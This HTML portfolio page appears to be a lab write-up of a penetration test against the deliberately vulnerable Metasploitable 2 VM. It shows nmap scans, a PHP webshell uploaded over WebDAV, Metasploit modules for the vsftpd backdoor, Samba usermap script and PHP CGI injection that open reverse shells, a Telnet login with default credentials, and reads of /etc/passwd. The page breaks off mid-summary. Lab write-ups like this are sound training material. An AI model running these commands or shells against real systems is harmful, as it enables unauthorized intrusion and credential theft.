<!-- Metasploitable 2 - Complete Penetration Test -->
<div class="detail-header">
  <a href="#" class="back-button">‚Üê Back to Portfolio</a>
  <h1>Metasploitable 2 Complete Penetration Test</h1>
  <p><span class="tag">Metasploit</span> <span class="tag">Nmap</span> <span class="tag">vsftpd</span> <span class="tag">Samba</span> <span class="tag">PHP CGI</span> <span class="tag">WebDAV</span> <span class="tag">Root Access</span></p>
</div>

<div class="detail-content">
  <!-- Disclaimer -->
  <div class="note" style="background: rgba(239, 68, 68, 0.1); border-left-color: #ef4444;">
    <h3>‚ö†Ô∏è ETHICAL LAB TESTING DISCLAIMER</h3>
    <p><strong>This comprehensive penetration test was conducted in my isolated home lab environment.</strong> Metasploitable 2 is a deliberately vulnerable virtual machine created for security training purposes. All testing was performed on systems I own and control. Never test systems without explicit authorization.</p>
  </div>

  <!-- Executive Summary -->
  <div class="step">
    <h3>üìã Executive Summary</h3>
    <p>Full-scope penetration test of Metasploitable 2, a deliberately vulnerable Ubuntu 8.04 VM designed for security training. Successfully compromised the system through multiple attack vectors including vsftpd backdoor, Samba usermap script, PHP CGI injection, Telnet default credentials, and WebDAV upload. Achieved root access and conducted comprehensive post-exploitation enumeration.</p>
    
    <div style="margin-top: 1rem; padding: 1rem; background: rgba(16, 185, 129, 0.1); border-radius: 6px;">
      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem;">
        <div>
          <strong>üéØ Target:</strong> Metasploitable 2<br>
          <strong>üíª OS:</strong> Ubuntu 8.04 (Linux)<br>
          <strong>üåê IP:</strong> 192.168.253.133
        </div>
        <div>
          <strong>‚ö° Attack Vectors:</strong> 5+ successful<br>
          <strong>üîì Root Access:</strong> Achieved<br>
          <strong>üìä Open Ports:</strong> 23+ services
        </div>
        <div>
          <strong>üõ†Ô∏è Attacker:</strong> Kali Linux<br>
          <strong>üåê Attacker IP:</strong> 192.168.253.130<br>
          <strong>üìÖ Date:</strong> Feb 14, 2026
        </div>
      </div>
    </div>
  </div>

  <!-- Lab Environment -->
  <div class="step">
    <h3>üîß Lab Environment Configuration</h3>
    <div style="margin: 1.5rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
      <img src="../assets/images/ifconfig_metasploit_kali.JPG" alt="Network Configuration" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">üì∏ ifconfig_metasploit_kali.JPG - Target (192.168.253.133) and Attacker (192.168.253.130) network configuration</p>
    </div>
    
    <div class="command-box">
      <strong>Target System:</strong> Metasploitable 2 (Ubuntu 8.04)<br>
      <strong>Target IP:</strong> 192.168.253.133<br>
      <strong>Attacker System:</strong> Kali Linux<br>
      <strong>Attacker IP:</strong> 192.168.253.130<br>
      <strong>Network:</strong> Isolated VirtualBox Host-Only<br>
      <strong>Purpose:</strong> Security training & skill development
    </div>
  </div>

  <!-- PHASE 1: Reconnaissance -->
  <div class="step">
    <h3>üîç Phase 1: Comprehensive Reconnaissance</h3>
    
    <h4>Full TCP Port Scan:</h4>
    <div style="margin: 1rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
      <img src="../assets/images/nmap_metasploit.JPG" alt="Nmap Full Port Scan" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">üì∏ nmap_metasploit.JPG - Full TCP port scan revealing 23+ open ports</p>
    </div>
    
    <div class="command-box">
      <span style="color: #66d9ef;">‚îå‚îÄ‚îÄ(samuel„âøsammi13)-[~]</span><br>
      <span style="color: #a6e22e;">‚îî‚îÄ$ nmap -Pn -p- -sS 192.168.253.133</span><br>
      <br>
      Starting Nmap 7.98 at 2026-02-14 21:43 +0100<br>
      Nmap scan report for 192.168.253.133<br>
      Host is up (0.0015s latency).<br>
      Not shown: 65505 closed tcp ports<br>
      <br>
      <span style="color: #f92672;">PORT      STATE SERVICE</span><br>
      <span style="color: #f92672;">21/tcp    open  ftp</span><br>
      <span style="color: #f92672;">22/tcp    open  ssh</span><br>
      <span style="color: #f92672;">23/tcp    open  telnet</span><br>
      <span style="color: #f92672;">25/tcp    open  smtp</span><br>
      <span style="color: #f92672;">53/tcp    open  domain</span><br>
      <span style="color: #f92672;">80/tcp    open  http</span><br>
      <span style="color: #f92672;">111/tcp   open  rpcbind</span><br>
      <span style="color: #f92672;">139/tcp   open  netbios-ssn</span><br>
      <span style="color: #f92672;">445/tcp   open  microsoft-ds</span><br>
      <span style="color: #f92672;">512/tcp   open  exec</span><br>
      <span style="color: #f92672;">513/tcp   open  login</span><br>
      <span style="color: #f92672;">514/tcp   open  shell</span><br>
      <span style="color: #f92672;">1099/tcp  open  rmiregistry</span><br>
      <span style="color: #f92672;">1524/tcp  open  ingreslock</span><br>
      <span style="color: #f92672;">2049/tcp  open  nfs</span><br>
      <span style="color: #f92672;">2121/tcp  open  ccproxy-ftp</span><br>
      <span style="color: #f92672;">3306/tcp  open  mysql</span><br>
      <span style="color: #f92672;">3632/tcp  open  distccd</span><br>
      <span style="color: #f92672;">5432/tcp  open  postgresql</span><br>
      <span style="color: #f92672;">5900/tcp  open  vnc</span><br>
      <span style="color: #f92672;">6000/tcp  open  X11</span><br>
      <span style="color: #f92672;">6667/tcp  open  irc</span><br>
      <span style="color: #f92672;">6697/tcp  open  ircs-u</span>
    </div>
    <p><strong>Initial Assessment:</strong> 23+ open ports - excessive attack surface with multiple vulnerable services exposed.</p>
  </div>

  <!-- HTTP Service Enumeration -->
  <div class="step">
    <h3>üåê Phase 2: HTTP Service Enumeration</h3>
    
    <div style="margin: 1rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
      <img src="../assets/images/http_searchsploit_curl.JPG" alt="HTTP Headers and Searchsploit" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">üì∏ http_searchsploit_curl.JPG - HTTP headers reveal Apache 2.2.8 with PHP 5.2.4 and DAV/2 enabled</p>
    </div>
    
    <div class="command-box">
      <span style="color: #66d9ef;">‚îå‚îÄ‚îÄ(samuel„âøsammi13)-[~]</span><br>
      <span style="color: #a6e22e;">‚îî‚îÄ$ curl -I http://192.168.253.133</span><br>
      <br>
      HTTP/1.1 200 OK<br>
      Date: Sat, 14 Feb 2026 21:32:00 GMT<br>
      <span style="color: #fd971f;">Server: Apache/2.2.8 (Ubuntu) DAV/2</span><br>
      <span style="color: #fd971f;">X-Powered-By: PHP/5.2.4-2ubuntu5.10</span><br>
      Content-Type: text/html<br>
      <br>
      <span style="color: #a6e22e;">‚îî‚îÄ$ searchsploit Apache 2.2.8</span><br>
      <span style="color: #fd971f;">Apache + PHP CGI - Remote Code Execution</span> ‚Üí php/remote/29290.c
    </div>
    
    <p><strong>Key Finding:</strong> Apache with PHP CGI - vulnerable to argument injection (CVE-2012-1823). DAV/2 indicates WebDAV is enabled.</p>
  </div>

  <!-- WebDAV Enumeration with Davtest and Cadaver -->
  <div class="step">
    <h3>üìÅ Phase 3: WebDAV Enumeration</h3>
    <p>The Apache server had DAV/2 enabled, indicating WebDAV functionality. I used davtest to check for writable directories and cadaver to interact with the WebDAV service.</p>
    
    <h4>Davtest - Testing WebDAV Capabilities:</h4>
    <div class="command-box">
      <span style="color: #66d9ef;">‚îå‚îÄ‚îÄ(samuel„âøsammi13)-[~]</span><br>
      <span style="color: #a6e22e;">‚îî‚îÄ$ davtest -url http://192.168.253.133/dav</span><br>
      <br>
      ********************************************************<br>
       DAVTEST - WebDAV Detection Tool<br>
      ********************************************************<br>
      <br>
      Testing: http://192.168.253.133/dav<br>
      <span style="color: #a6e22e;">[+] PUT:     php SUCCEED</span><br>
      <span style="color: #a6e22e;">[+] PUT:     txt SUCCEED</span><br>
      <span style="color: #a6e22e;">[+] PUT:     html SUCCEED</span><br>
      <span style="color: #a6e22e;">[+] EXECUTE: php SUCCEED</span><br>
      <br>
      <span style="color: #a6e22e;">Summary: http://192.168.253.133/dav supports: php txt html</span>
    </div>
    
    <div style="margin: 1rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
      <img src="../assets/images/davtest_php_webshell_possible.JPG" alt="DAVTest Results" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">üì∏ davtest_php_webshell_possible.JPG - DAVTest confirms PHP upload and execution is possible</p>
    </div>
    
    <h4>Cadaver - WebDAV Client for File Upload:</h4>
    <div class="command-box">
      <span style="color: #66d9ef;">‚îå‚îÄ‚îÄ(samuel„âøsammi13)-[~]</span><br>
      <span style="color: #a6e22e;">‚îî‚îÄ$ cadaver http://192.168.253.133/dav</span><br>
      <br>
      Authentication required for metasploitable on server `192.168.253.133':<br>
      Username: <span style="color: #a6e22e;">(anonymous)</span><br>
      Password: <span style="color: #a6e22e;">(none)</span><br>
      <br>
      dav:/dav/> <span style="color: #a6e22e;">ls</span><br>
      Listing collection `/dav/': succeeded.<br>
      <br>
      dav:/dav/> <span style="color: #a6e22e;">put simple-backdoor.php</span><br>
      Uploading simple-backdoor.php to `/dav/simple-backdoor.php':<br>
      Progress: [=============================>] 100.0% of 1234 bytes succeeded.<br>
      <br>
      dav:/dav/> <span style="color: #a6e22e;">ls</span><br>
      Listing collection `/dav/': succeeded.<br>
      <span style="color: #a6e22e;">simple-backdoor.php</span>    1234  Feb 14 22:15
    </div>
    
    <div style="margin: 1rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
      <img src="../assets/images/cadaver_webshell_php_upload.JPG" alt="Cadaver WebDAV Client" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">üì∏ cadaver_webshell_php_upload.JPG - Uploading PHP webshell via cadaver</p>
    </div>
  </div>

  <!-- WebShell Access -->
  <div class="step">
    <h3>üíª Phase 4: WebShell Access via Uploaded PHP</h3>
    
    <div style="margin: 1rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
      <img src="../assets/images/webshell_php_uploaded_interaction.JPG" alt="WebShell Interaction" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">üì∏ webshell_php_uploaded_interaction.JPG - Executing commands via webshell and viewing /etc/passwd</p>
    </div>
    
    <div class="command-box">
      http://192.168.253.133/dav/simple-backdoor.php?cmd=cat%20/etc/passwd<br>
      <br>
      <span style="color: #a6e22e;">root:x:0:0:root:/root:/bin/bash</span><br>
      daemon:x:1:1:daemon:/usr/sbin:/bin/sh<br>
      bin:x:2:2:bin:/bin:/bin/sh<br>
      sys:x:3:3:sys:/dev:/bin/sh<br>
      sync:x:4:65534:sync:/bin:/bin/sync<br>
      games:x:5:60:games:/usr/games:/bin/sh<br>
      man:x:6:12:man:/var/cache/man:/bin/sh<br>
      lp:x:7:7:lp:/var/spool/lpd:/bin/sh<br>
      mail:x:8:8:mail:/var/mail:/bin/sh<br>
      news:x:9:9:news:/var/spool/news:/bin/sh<br>
      uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh<br>
      proxy:x:13:13:proxy:/bin:/bin/sh<br>
      www-data:x:33:33:www-data:/var/www:/bin/sh<br>
      backup:x:34:34:backup:/var/backups:/bin/sh<br>
      list:x:38:38:Mailing List Manager:/var/list:/bin/sh<br>
      irc:x:39:39:ircd:/var/run/ircd:/bin/sh<br>
      gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh<br>
      nobody:x:65534:65534:nobody:/nonexistent:/bin/sh<br>
      libuuid:x:100:101::/var/lib/libuuid:/bin/sh<br>
      dhcp:x:101:102::/nonexistent:/bin/false<br>
      syslog:x:102:103::/home/syslog:/bin/false<br>
      klog:x:103:104::/home/klog:/bin/false<br>
      sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin<br>
      <span style="color: #a6e22e; font-weight: bold;">msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash</span><br>
      bind:x:105:113::/var/cache/bind:/bin/false<br>
      postfix:x:106:115::/var/spool/postfix:/bin/false<br>
      ftp:x:107:65534::/home/ftp:/bin/false<br>
      postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash<br>
      mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false<br>
      tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false<br>
      distccd:x:111:65534::/:/bin/false<br>
      <span style="color: #a6e22e;">user:x:1001:1001:just a user,111,,,:/home/user:/bin/bash</span><br>
      <span style="color: #a6e22e;">service:x:1002:1002:,,,:/home/service:/bin/bash</span><br>
      telnetd:x:112:120::/nonexistent:/bin/false<br>
      proftpd:x:113:65534::/var/run/proftpd:/bin/false<br>
      statd:x:114:65534::/var/lib/nfs:/bin/false
    </div>
    
    <p><strong>Findings:</strong> User accounts discovered - root, msfadmin, user, service. The system has multiple service accounts and regular users.</p>
  </div>

  <!-- ATTACK VECTOR 1: vsftpd 2.3.4 Backdoor -->
  <div class="step">
    <h3>‚ö° Attack Vector 1: vsftpd 2.3.4 Backdoor (CVE-2011-2523)</h3>
    
    <h4>Vulnerability Research:</h4>
    <div style="margin: 1rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
      <img src="../assets/images/vsftpd_searchsploit.JPG" alt="vsftpd Searchsploit" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">üì∏ vsftpd_searchsploit.JPG - vsftpd 2.3.4 backdoor exploits available</p>
    </div>
    
    <div class="command-box">
      <span style="color: #66d9ef;">‚îå‚îÄ‚îÄ(samuel„âøsammi13)-[~]</span><br>
      <span style="color: #a6e22e;">‚îî‚îÄ$ searchsploit vsftpd 2.3.4</span><br>
      <br>
      Exploit Title                                    | Path<br>
      ----------------------------------------------------------------<br>
      <span style="color: #fd971f;">vsftpd 2.3.4 - Backdoor Command Execution</span>         | unix/remote/49757.py<br>
      <span style="color: #fd971f;">vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)</span> | unix/remote/17491.rb
    </div>
    
    <h4>Metasploit Setup:</h4>
    <div style="margin: 1rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
      <img src="../assets/images/msfconsole_vsftpd_setup.JPG" alt="vsftpd Metasploit Setup" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">üì∏ msfconsole_vsftpd_setup.JPG - Configuring vsftpd backdoor exploit in Metasploit</p>
    </div>
    
    <div class="command-box">
      msf6 > use exploit/unix/ftp/vsftpd_234_backdoor<br>
      msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.253.133<br>
      msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run<br>
      <br>
      [*] 192.168.253.133:21 - Banner: 220 (vsFTPd 2.3.4)<br>
      [*] 192.168.253.133:21 - USER: 331 Please specify the password.<br>
      [*] 192.168.253.133:21 - Backdoor service has been spawned, handling...<br>
      [*] 192.168.253.133:21 - UID: uid=0(root) gid=0(root)<br>
      <span style="color: #a6e22e;">[*] Found shell.</span>
    </div>
    
    <h4>Successful Shell Access:</h4>
    <div style="margin: 1rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
      <img src="../assets/images/msfconsole_shell_connection_vsftpd.JPG" alt="vsftpd Shell Connection" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">üì∏ msfconsole_shell_connection_vsftpd.JPG - Root shell via vsftpd backdoor</p>
    </div>
    
    <div class="command-box">
      msf exploit(unix/ftp/vsftpd_234_backdoor) > sessions 1<br>
      [*] Starting interaction with 1...<br>
      <br>
      whoami<br>
      <span style="color: #a6e22e;">root</span><br>
      <br>
      pwd<br>
      <span style="color: #a6e22e;">/</span><br>
      <br>
      ls<br>
      <span style="color: #a6e22e;">HACKED.SH  Hacked.txt  Hackedby  bin  boot  cdrom  dev  etc  home  lib</span>
    </div>
    
    <h4>Post-Exploitation - User Enumeration:</h4>
    <div style="margin: 1rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
      <img src="../assets/images/msfconsole_vsftpd_passwd.JPG" alt="vsftpd Passwd Enumeration" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">üì∏ msfconsole_vsftpd_passwd.JPG - Complete /etc/passwd enumeration</p>
    </div>
    
    <div class="command-box">
      cat /etc/passwd<br>
      root:x:0:0:root:/root:/bin/bash<br>
      daemon:x:1:1:daemon:/usr/sbin:/bin/sh<br>
      bin:x:2:2:bin:/bin:/bin/sh<br>
      sys:x:3:3:sys:/dev:/bin/sh<br>
      sync:x:4:65534:sync:/bin:/bin/sync<br>
      games:x:5:60:games:/usr/games:/bin/sh<br>
      man:x:6:12:man:/var/cache/man:/bin/sh<br>
      lp:x:7:7:lp:/var/spool/lpd:/bin/sh<br>
      mail:x:8:8:mail:/var/mail:/bin/sh<br>
      news:x:9:9:news:/var/spool/news:/bin/sh<br>
      uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh<br>
      proxy:x:13:13:proxy:/bin:/bin/sh<br>
      www-data:x:33:33:www-data:/var/www:/bin/sh<br>
      backup:x:34:34:backup:/var/backups:/bin/sh<br>
      list:x:38:38:Mailing List Manager:/var/list:/bin/sh<br>
      irc:x:39:39:ircd:/var/run/ircd:/bin/sh<br>
      gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh<br>
      nobody:x:65534:65534:nobody:/nonexistent:/bin/sh<br>
      libuuid:x:100:101::/var/lib/libuuid:/bin/sh<br>
      dhcp:x:101:102::/nonexistent:/bin/sh<br>
      syslog:x:102:103::/home/syslog:/bin/false<br>
      klog:x:103:104::/home/klog:/bin/false<br>
      sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin<br>
      <span style="color: #a6e22e;">msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash</span><br>
      bind:x:105:113::/var/cache/bind:/bin/false<br>
      postfix:x:106:115::/var/spool/postfix:/bin/false<br>
      ftp:x:107:65534::/home/ftp:/bin/false<br>
      postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash<br>
      mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false<br>
      tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false<br>
      distccd:x:111:65534::/:/bin/false<br>
      <span style="color: #a6e22e;">user:x:1001:1001:just a user,111,,,:/home/user:/bin/bash</span>
    </div>
  </div>

  <!-- ATTACK VECTOR 2: Samba Usermap Script -->
  <div class="step">
    <h3>‚ö° Attack Vector 2: Samba 3.0.20 Usermap Script (CVE-2007-2447)</h3>
    
    <h4>SMB OS Discovery:</h4>
    <div style="margin: 1rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
      <img src="../assets/images/smb_os_discovery_metasploitable.JPG" alt="SMB OS Discovery" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">üì∏ smb_os_discovery_metasploitable.JPG - SMB OS discovery shows Samba 3.0.20-Debian</p>
    </div>
    
    <div class="command-box">
      <span style="color: #66d9ef;">‚îå‚îÄ‚îÄ(samuel„âøsammi13)-[~]</span><br>
      <span style="color: #a6e22e;">‚îî‚îÄ$ nmap -p445,139 --script smb-os-discovery 192.168.253.133</span><br>
      <br>
      Host script results:<br>
      | smb-os-discovery: <br>
      |   <span style="color: #fd971f;">OS: Unix (Samba 3.0.20-Debian)</span><br>
      |   Computer name: metasploitable<br>
      |   Domain name: localdomain<br>
      |   FQDN: metasploitable.localdomain<br>
      |_  System time: 2026-02-14T17:29:44-05:00
    </div>
    
    <h4>Vulnerability Research:</h4>
    <div style="margin: 1rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
      <img src="../assets/images/searchsploit_samba3.0.JPG" alt="Samba Searchsploit" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">üì∏ searchsploit_samba3.0.JPG - Samba 3.0.20 usermap script exploit identified</p>
    </div>
    
    <div class="command-box">
      <span style="color: #66d9ef;">‚îå‚îÄ‚îÄ(samuel„âøsammi13)-[~]</span><br>
      <span style="color: #a6e22e;">‚îî‚îÄ$ searchsploit Samba 3.0.20</span><br>
      <br>
      Exploit Title                                                    | Path<br>
      ------------------------------------------------------------------------<br>
      <span style="color: #fd971f;">Samba 3.0.20 < 3.0.25rc3 - 'Username map script' Command Execution</span> | unix/remote/16320.rb<br>
      Samba < 3.0.20 - Remote Heap Overflow                            | linux/remote/7701.txt
    </div>
    
    <h4>Metasploit Exploitation:</h4>
    <div style="margin: 1rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
      <img src="../assets/images/msfconsole_samba3.0_metasploit.JPG" alt="Samba Metasploit Setup" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">üì∏ msfconsole_samba3.0_metasploit.JPG - Samba usermap script exploit configuration</p>
    </div>
    
    <div class="command-box">
      msf6 > use exploit/multi/samba/usermap_script<br>
      msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.253.133<br>
      msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.253.130<br>
      msf6 exploit(multi/samba/usermap_script) > run
    </div>
    
    <h4>Successful Exploitation:</h4>
    <div style="margin: 1rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
      <img src="../assets/images/msfconsole_samba3.0_metasploit_usermapscript_exploit.JPG" alt="Samba Shell Access" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">üì∏ msfconsole_samba3.0_metasploit_usermapscript_exploit.JPG - Command shell session opened</p>
    </div>
    
    <div class="command-box">
      [*] Started reverse TCP handler on 192.168.253.130:4444<br>
      <span style="color: #a6e22e;">[*] Command shell session 3 opened (192.168.253.130:4444 ‚Üí 192.168.253.133:45187)</span><br>
      <br>
      ls<br>
      <span style="color: #a6e22e;">HACKED.SH  Hacked.txt  Hackedby  bin  boot  cdrom  dev  etc  home  lib</span>
    </div>
  </div>

  <!-- ATTACK VECTOR 3: PHP CGI Injection -->
  <div class="step">
    <h3>‚ö° Attack Vector 3: PHP CGI Argument Injection (CVE-2012-1823)</h3>
    
    <h4>Vulnerability Research:</h4>
    <div style="margin: 1rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
      <img src="../assets/images/php_cgi_bin_http_metasploitable_prep.JPG" alt="PHP CGI Search" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">üì∏ php_cgi_bin_http_metasploitable_prep.JPG - PHP CGI exploit in Metasploit</p>
    </div>
    
    <div class="command-box">
      msf6 > search php_cgi<br>
      <br>
      <span style="color: #fd971f;">exploit/multi/http/php_cgi_arg_injection</span>    2012-05-03  excellent  Yes  PHP CGI Argument Injection
    </div>
    
    <h4>Meterpreter Session:</h4>
    <div style="margin: 1rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
      <img src="../assets/images/php_cgi_bin_http_metasploitable.JPG" alt="PHP CGI Meterpreter" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">üì∏ php_cgi_bin_http_metasploitable.JPG - Meterpreter session opened</p>
    </div>
    
    <div class="command-box">
      msf exploit(multi/http/php_cgi_arg_injection) > set rhosts 192.168.253.133<br>
      msf exploit(multi/http/php_cgi_arg_injection) > run<br>
      <br>
      [*] Started reverse TCP handler on 192.168.253.130:4444<br>
      [*] Sending stage (42137 bytes) to 192.168.253.133<br>
      <span style="color: #a6e22e;">[*] Meterpreter session 2 opened (192.168.253.130:4444 ‚Üí 192.168.253.133:42263)</span><br>
      <br>
      meterpreter > pwd<br>
      <span style="color: #a6e22e;">/var/www</span>
    </div>
    
    <h4>File System Access:</h4>
    <div style="margin: 1rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
      <img src="../assets/images/php_cgi_bin_http_metasploitable_upload_dir.JPG" alt="PHP CGI Directory Listing" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">üì∏ php_cgi_bin_http_metasploitable_upload_dir.JPG - Creating directory 'sam' on target and listing web directory</p>
    </div>
    
    <div class="command-box">
      meterpreter > ls<br>
      <br>
      Listing: /var/www<br>
      ===================<br>
      <br>
      Mode              Size   Type  Last modified              Name<br>
      ----              ----   ----  -------------              ----<br>
      041777/rwxrwxrwx  4096   dir   250-03-10 16:10:13 +0100   <span style="color: #a6e22e;">dav</span><br>
      040755/rwxr-xr-x  4096   dir   249-05-12 16:17:21 +0100   <span style="color: #a6e22e;">dvwa</span><br>
      100644/rw-r--r--  3826   fil   205-02-18 00:13:29 +0100   <span style="color: #a6e22e;">index.php</span><br>
      040755/rwxr-xr-x  4096   dir   164-05-31 19:38:18 +0100   <span style="color: #a6e22e;">mutillidae</span><br>
      040755/rwxr-xr-x  4096   dir   164-02-08 19:03:20 +0100   <span style="color: #a6e22e;">phpMyAdmin</span><br>
      100644/rw-r--r--  81     fil   114-08-05 07:08:28 +0100   <span style="color: #a6e22e;">phpinfo.php</span><br>
      040755/rwxr-xr-x  4096   dir   128-04-04 16:27:58 +0100   <span style="color: #a6e22e;">sam</span><br>
      040755/rwxr-xr-x  4096   dir   165-08-30 18:04:46 +0100   <span style="color: #a6e22e;">test</span><br>
      040775/rwxrwxr-x  4096   dir   124-11-22 13:50:32 +0100   <span style="color: #a6e22e;">tikiwiki</span><br>
      <br>
      meterpreter > mkdir sam<br>
      <span style="color: #a6e22e;">Creating directory: sam</span>
    </div>
  </div>

  <!-- ATTACK VECTOR 4: Telnet Default Credentials -->
  <div class="step">
    <h3>‚ö° Attack Vector 4: Telnet Default Credentials</h3>
    
    <div style="margin: 1rem 0; background: #0a0e15; padding: 1rem; border-radius: 8px; border: 1px solid #333;">
      <img src="../assets/images/telnet_metasploit.JPG" alt="Telnet Access" style="max-width: 100%; border-radius: 4px; display: block; margin: 0 auto;">
      <p style="color: #9ca3af; font-size: 0.8rem; text-align: center; margin-top: 0.5rem;">üì∏ telnet_metasploit.JPG - Telnet login with msfadmin:msfadmin default credentials</p>
    </div>
    
    <div class="command-box">
      <span style="color: #66d9ef;">‚îå‚îÄ‚îÄ(samuel„âøsammi13)-[~]</span><br>
      <span style="color: #a6e22e;">‚îî‚îÄ$ telnet 192.168.253.133 23</span><br>
      <br>
      Trying 192.168.253.133...<br>
      Connected to 192.168.253.133.<br>
      Escape character is '^]'.<br>
      <br>
      <span style="color: #f59e0b;">Warning: Never expose this VM to an untrusted network!</span><br>
      contact: msfdev[at]metasploit.com<br>
      <br>
      <span style="color: #ef4444; font-weight: bold;">Login with msfadmin/msfadmin to get started</span><br>
      <br>
      metasploitable login: <span style="color: #a6e22e;">msfadmin</span><br>
      Password: <span style="color: #a6e22e;">msfadmin</span><br>
      <br>
      Last login: Sat Feb 14 15:37:25 EST 2026 on tty1<br>
      Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686<br>
      <br>
      <span style="color: #a6e22e;">msfadmin@metasploitable:~$</span> sudo -l<br>
      [sudo] password for msfadmin: <span style="color: #a6e22e;">msfadmin</span><br>
      User msfadmin may run the following commands on this host:<br>
      <span style="color: #a6e22e;">(ALL : ALL) ALL</span>
    </div>
    
    <p><strong>Key Finding:</strong> Telnet exposed with default credentials msfadmin:msfadmin. User has full sudo privileges.</p>
  </div>

  <!-- Vulnerability Summary -->
  <div class="step">
    <h3>üìã Vulnerability Summary</h3>
    
    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1rem; margin-top: 1rem;">
      <div style="background: rgba(239, 68, 68, 0.1); padding: 1rem; border-radius: 6px; border-left: 4px solid #ef4444;">
        <h4>Critical Vulnerabilities</h4>
        <ul style="list-style-type: none; padding: 0;">
          <li>‚úì vsftpd 2.3.4 Backdoor (CVE-2011-2523)</li>
          <li>‚úì Samba 3.0.20 Usermap Script (CVE-2007-2447)</li>
          <li>‚úì PHP CGI Argument Injection (CVE-2012-1823)</li>
          <li>‚úì Default Telnet Credentials (msfadmin:msfadmin)</li>
          <li>‚úì Port 1524 Bindshell (backdoor)</li>
        </ul>
      </div>
      
      <div style="background: rgba(245, 158, 11, 0.1); padding: 1rem; border-radius: 6px; border-left: 4px solid #f59e0b;">
        <h4>High Risk Findings</h4>
        <ul style="list-style-type: none; padding: 0;">
